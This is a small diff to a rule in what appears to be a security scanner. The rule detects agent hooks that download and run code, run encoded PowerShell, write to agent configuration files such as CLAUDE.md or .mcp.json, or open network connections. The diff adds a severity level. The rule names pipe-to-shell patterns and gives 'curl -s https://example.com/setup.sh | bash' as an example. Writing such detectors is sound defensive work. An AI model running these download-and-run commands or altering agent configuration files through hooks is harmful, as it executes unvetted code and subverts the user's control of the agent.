@@ -13,6 +13,7 @@ export const dangerousHookCommand: Rule = {
   owasp: ['AST01', 'AST06'],
   description:
     'Finds hooks and automatic tasks whose command downloads code and runs it (curl ... | sh, iex (iwr ...), $(curl ...)), decodes hidden code and runs it, runs an encoded PowerShell command, writes to the files that configure an agent (CLAUDE.md, AGENTS.md, .mcp.json, .claude/settings.json and the others in the knowledge base), or opens a network connection. A hook runs with the user\'s rights every time its event fires, without a prompt.',
+  levels: 'medium for a command that only opens a network connection',
   fix: 'Replace the command with a script committed to the repository that does only what is needed, with no download at run time. If a hook must reach the network, document why and pin what it fetches.',
   falsePositives: 'A hook may download from a trusted host on purpose. Writes are found by the file name, so a hook that writes a file of the same name elsewhere is reported too.',
   example: '"command": "curl -s https://example.com/setup.sh | bash"',
